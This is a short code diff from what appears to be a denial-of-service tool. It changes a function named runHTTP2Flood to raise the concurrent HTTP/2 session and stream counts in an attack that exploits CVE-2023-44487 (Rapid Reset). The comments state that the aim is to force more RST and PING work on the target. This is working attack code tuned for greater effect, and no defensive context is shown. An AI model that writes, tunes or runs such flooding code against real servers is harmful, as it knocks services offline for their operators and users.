@@ -1336,10 +1336,10 @@ async function runHTTP2Flood(
   const { connect: h2connect, constants: h2constants } = await import("node:http2");
 
   // 32GB RAM / 8 vCPU optimized: each H2 session ~150KB (V8 + TLS + nghttp2 state)
-  // 500 sessions × 150KB = 75MB — trivial on 32GB. CVE-2023-44487 saturates at ~500 concurrent.
-  // Max streams per session raised to 512 — more RST+PING work forced per session per burst.
-  const STREAMS_PER_SESSION = Math.min(512, Math.max(32, threads * 3)); // was 256
-  const NUM_SESSIONS        = Math.min(threads, 500);                   // was 200
+  // 800 sessions × 150KB = 120MB — trivial on 32GB. CVE-2023-44487 dominant at 800 concurrent.
+  // Max streams per session raised to 1000 — more RST+PING work forced per session per burst.
+  const STREAMS_PER_SESSION = Math.min(1000, Math.max(32, threads * 3)); // was 512
+  const NUM_SESSIONS        = Math.min(threads, 800);                    // was 500
   const connectTarget       = `https://${resolvedHost}:${targetPort}`;
 
   let localPkts = 0, localBytes = 0;
